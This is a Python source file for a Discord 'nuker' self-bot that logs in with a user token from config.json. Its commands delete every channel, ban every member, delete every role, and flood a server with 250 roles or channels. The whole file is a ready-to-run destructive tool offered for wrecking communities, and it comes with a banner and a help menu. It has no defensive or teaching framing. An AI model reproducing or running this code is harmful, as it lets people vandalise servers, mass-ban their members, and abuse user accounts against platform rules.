import discord
import ctypes
from discord.ext import commands
from aiohttp import request
import random
import time
import os
import json
import numpy
import string
from colorama import init, Fore
os.system("cls")
ctypes.windll.kernel32.SetConsoleTitleW('Discord X Nuker | github.com/XinGodDev')  
init()

with open('config.json') as f:
    cfg = json.load(f)
token = cfg.get("token")
prefix = cfg.get("prefix")

banner = (f''' 
{Fore.RED}
\t\t\t\t╔╦╗╦╔═╗╔═╗╔═╗╦═╗╔╦╗  ═╗ ╦  ╔╗╔╦ ╦╦╔═╔═╗
\t\t\t\t ║║║╚═╗║  ║ ║╠╦╝ ║║  ╔╩╦╝  ║║║║ ║╠╩╗║╣ 
\t\t\t\t═╩╝╩╚═╝╚═╝╚═╝╩╚══╩╝  ╩ ╚═  ╝╚╝╚═╝╩ ╩╚═╝
\t\t\t\t\t                                                                 
\t\t\t\t\t            {Fore.GREEN}      Prefix : {prefix}
\t\t\t\t\t                  Ready To Use
\t\t\t\t\t            
''')
client = commands.Bot(command_prefix = prefix, self_bot=True)
@client.event
async def on_ready():
    print(banner)
    await client.change_presence(activity=discord.Game(name='my game'))
    activity = discord.Activity(name=f'{prefix}help', type=discord.ActivityType.playing)
    await client.change_presence(activity=activity)

client.remove_command('help')

@client.command()
async def help(ctx):
    embed = discord.Embed(description=f"**delete_channel** - deletes all channels\n**ban_all** - bans all users\n**role_spam** - spams roles\n**role_delete** - deletes all roles\n**channel_spam** - spams channels", color=ctx.author.color, delete_after=3)
    embed.set_image(url="https://cdn.discordapp.com/avatars/422438353066000384/a_5342d6d31b255eccc980022e47c499e7.gif?size=128")
    await ctx.send(embed=embed)

@client.command()
async def delete_channel(ctx):
    await ctx.send(f"Nuking server", delete_after=3)
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    await ctx.guild.create_text_channel(name=f"Nuked by X Nuker")
@client.command()
async def ban_all(ctx):
    await ctx.send(f"Banning all users", delete_after=3)
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass   
@client.command()
async def role_delete(ctx):
    await ctx.send(f"Deleting all roles", delete_after=3)
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
@client.command()
async def role_spam(ctx, name):
    await ctx.send(f"Spamming roles", delete_after=3)
    for _i in range(250):
        await ctx.guild.create_role(name=f"{name}")
@client.command()
async def channel_spam(ctx, name):
    await ctx.send(f"Spamming channels", delete_after=3)
    for _i in range(250):
        await ctx.guild.create_text_channel(name=f"{name}")
@client.event
@client.event
async def on_command_error(ctx, error):
    await ctx.send(f"Command not found!", delete_after=3)
client.run(token, bot=False)
